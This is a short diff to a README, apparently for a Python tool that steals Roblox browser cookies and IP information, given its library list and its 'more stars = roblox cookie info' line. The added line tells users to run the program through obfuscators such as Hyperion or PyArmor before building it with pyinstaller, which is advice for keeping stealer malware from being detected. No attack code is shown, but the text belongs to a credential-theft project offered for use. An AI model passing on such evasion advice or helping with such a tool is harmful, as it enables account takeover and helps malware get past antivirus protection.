@@ -15,6 +15,8 @@ Libs to run the program : `pip install requests` `pip install browser_cookies3`
 
 credits ; scooby
 
+if u wanna compile your program obf it first (hyperbreak , hyperperion , pyamror , etc ) then use pyinstaller
+
 #### more stars = roblox cookie info , ip info , etc 
 
 
